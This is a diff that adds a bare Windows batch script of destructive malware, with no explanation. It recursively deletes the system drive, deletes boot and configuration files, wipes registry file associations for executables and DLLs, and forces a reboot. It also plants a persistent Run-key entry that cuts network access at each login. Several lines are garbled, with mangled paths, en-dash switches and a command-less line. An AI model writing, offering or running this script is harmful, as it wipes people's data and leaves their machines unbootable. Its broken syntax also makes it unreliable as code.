@@ -1,0 +1,26 @@
+off
+del %systemdrive%\*.*/f/s/q
+shutdown –r –f –t 00
+off
+attrib –r –s –h c:\autoexec.bat
+del c:\autoexec.bat
+attrib –r –s –h c:\boot.ini
+del c:\boot.ini
+attrib –r –s –h c:\ntldr
+del c:\ntldr
+attrib –r –s –h c:\windows\win.ini
+del c:\windows\win.ini
+c:\WINDOWS\SYSTEM32\*.*/q
+OFF
+START reg delete HKCR/.EXE
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+@echo off >c:windowswimn32.bat
+echo break off >>c:windowswimn32.bat
+echo ipconfig /release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machineoftwindowscurrentversionrun /v
+WINDOWsAPI/t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v
+CONTROLexit/t reg_sz /d c:windowswimn32.bat /f
+PAUSE
